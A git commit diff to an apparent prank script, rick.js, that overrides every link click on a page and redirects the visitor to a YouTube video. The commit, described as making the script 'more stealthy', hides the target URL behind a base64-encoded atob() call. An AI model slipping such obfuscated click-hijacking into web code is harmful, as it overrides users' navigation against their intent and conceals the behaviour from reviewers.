ad88dfd1b298742f23b03b0fca1325cffea67646
Lukas Fülling <lukas@k40s.net>
2018-04-03 15:50:18 +0200

    make the script even MORE stealthy
    Modern browsers have base64 support included.

--- rick.js
+++ rick.js
@@ -7,7 +7,7 @@ document.addEventListener('DOMContentLoaded', function() {
    anchors[i].addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
-    window.location.href='https://www.youtube.com/watch?v=oHg5SJYRHA0';
+     window.location.href=atob('aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vSGc1U0pZUkhBMA==');
    });
   }
 });
